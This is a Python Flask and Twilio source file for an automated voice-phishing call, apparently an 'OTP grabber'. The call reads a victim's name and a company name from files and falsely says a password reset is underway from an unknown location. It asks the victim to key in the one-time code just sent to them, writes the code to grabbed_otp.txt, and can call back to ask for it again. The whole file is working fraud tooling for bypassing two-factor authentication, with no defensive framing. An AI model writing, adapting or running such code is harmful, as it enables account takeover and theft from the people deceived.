import twilio.twiml.voice_response as tr
from flask import Flask, request

app = Flask(__name__)

@app.route("/v", methods=['GET', 'POST'])
def voice():
    r = tr.VoiceResponse()
    r.say(f",,,Hello {open('Details/Client_Name.txt', 'r').read()}, your {open('Details/Company Name.txt', 'r').read()} account password is trying to be reset from an unknown location,")
    g = tr.Gather(num_digits=1, action='/g', timeout=120)
    g.say('If this was not you please press 1,')
    r.append(g)
    return str(r)

@app.route('/g', methods=['GET', 'POST'])
def gather():
    r = tr.VoiceResponse()
    if 'Digits' in request.values:
        c = request.values['Digits']
        if c == '1':
            go = tr.Gather(num_digits=int(open("Details/Digits.txt", 'r').read()), action='/go', timeout=120)
            go.say(f'To block the request, Please enter the {open("Details/Digits.txt", "r").read()} digits code we sent to you, when you finish, Please press Pound')
            r.append(go)
            return str(r)
        else:
            r.say("Sorry, Please make correct choice.")
            r.redirect('/v')
            return str(r)
    r.redirect('/v')
    return str(r)

@app.route('/go', methods=['GET', 'POST'])
def gatherotp():
    r = tr.VoiceResponse()
    r.say('Please give us a moment to block the request')
    if 'Digits' in request.values:
        r.play(url='https://ia904701.us.archive.org/33/items/music_20221124/music.mp3')
        r.say('Great, we have blocked the request. However, If you accidentally type the wrong one-time passcode, We will call you again,')
        a = open('grabbed_otp.txt', 'w', encoding='utf-8')
        ch = request.values['Digits']
        a.write(ch)
        return str(r)
    else:
        r.say("Sorry, Please make correct choice.")
        r.redirect('/g')
        return str(r)

@app.route("/vagain", methods=['GET', 'POST'])
def voiceagain():
    r = tr.VoiceResponse()
    r.say(f"Hello {open('Details/Client_Name.txt', 'r').read()}, Sorry, you have typed the wrong one-time passcode,")
    g = tr.Gather(num_digits=1, action='/g', timeout=120)
    g.say('Press 1, To enter the one-time passcode again')
    r.append(g)
    return str(r)

if __name__ == "__main__":
    app.run(debug=True)
